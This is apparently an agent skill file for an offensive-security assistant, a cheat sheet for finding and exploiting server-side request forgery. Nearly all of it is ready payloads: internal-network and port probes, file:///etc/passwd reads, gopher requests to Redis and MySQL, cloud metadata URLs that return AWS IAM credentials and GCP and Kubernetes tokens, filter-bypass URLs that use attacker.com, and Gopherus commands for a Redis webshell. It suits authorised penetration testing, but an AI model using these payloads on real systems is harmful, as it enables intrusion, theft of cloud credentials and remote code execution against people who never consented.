---
name: ssrf-testing
description: Detect and exploit server-side request forgery to access internal resources and cloud metadata
origin: RedteamOpencode
---

# SSRF Testing

## When to Activate

- Parameter accepts URL/hostname: `url=`, `uri=`, `src=`, `dest=`, `redirect=`, `feed=`, `link=`
- PDF/doc generators fetching remote resources, file upload via URL, API integrations, proxy endpoints

## Detection

### 1. Out-of-Band Confirmation
```bash
?url=http://COLLABORATOR_DOMAIN/ssrf-test
?url=http://YOUR_SERVER:8888/ssrf-test
# Listener: python3 -m http.server 8888 / nc -lvp 8888
```

### 2. Internal Network Probing
```
http://127.0.0.1/  http://localhost/  http://0.0.0.0/  http://[::1]/
http://127.1/  http://0/  http://0x7f000001/  http://2130706433/
http://10.0.0.1/  http://172.16.0.1/  http://192.168.1.1/  http://169.254.169.254/
```

### 3. Protocol Testing
```
file:///etc/passwd                           # File read
gopher://127.0.0.1:6379/_INFO               # Redis
gopher://127.0.0.1:3306/_                   # MySQL
dict://127.0.0.1:6379/INFO                  # Dict
ftp://127.0.0.1/
```

### 4. Port Scanning via SSRF
Test http://127.0.0.1:PORT/ for common ports (22, 80, 3306, 6379, 8080, 9200, 27017).
Indicators: response time diffs, different errors, content length changes, status code diffs.

## Cloud Metadata

### AWS
```
# IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
# IMDSv2 requires PUT for token + X-aws-ec2-metadata-token header
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires Metadata-Flavor: Google header (legacy v1beta1 endpoint doesn't)
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Requires Metadata: true header
```

### Kubernetes
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
https://kubernetes.default.svc/
```

## Filter Bypass

### IP Encoding
```
http://2130706433/  http://0x7f000001/  http://0177.0.0.01/  # Decimal/Hex/Octal for 127.0.0.1
http://[::ffff:127.0.0.1]/  http://127.0.0x0.1/             # IPv6/mixed
```

### DNS Rebinding
```
# 127.0.0.1.nip.io  127-0-0-1.sslip.io  rbndr.us/dword
```

### URL Parsing Tricks
```
http://attacker.com@127.0.0.1/          # Credential section bypass
http://127.0.0.1#@attacker.com/
http://allowed-domain.com/redirect?url=http://127.0.0.1/  # Redirect chain
http://allowed.com\@127.0.0.1/          # Backslash
http://127.0.0.1.allowed.com/          # Subdomain wildcard
```

### Gopher Protocol Smuggling
```bash
# Redis webshell, MySQL, SMTP — use Gopherus tool:
gopherus --exploit redis
gopherus --exploit mysql
```

## Internal Service Targets
```
http://127.0.0.1:9200/_cat/indices     # Elasticsearch
http://127.0.0.1:2375/containers/json  # Docker API
http://127.0.0.1:8500/v1/kv/?recurse   # Consul
https://127.0.0.1:10250/pods/          # Kubelet
```
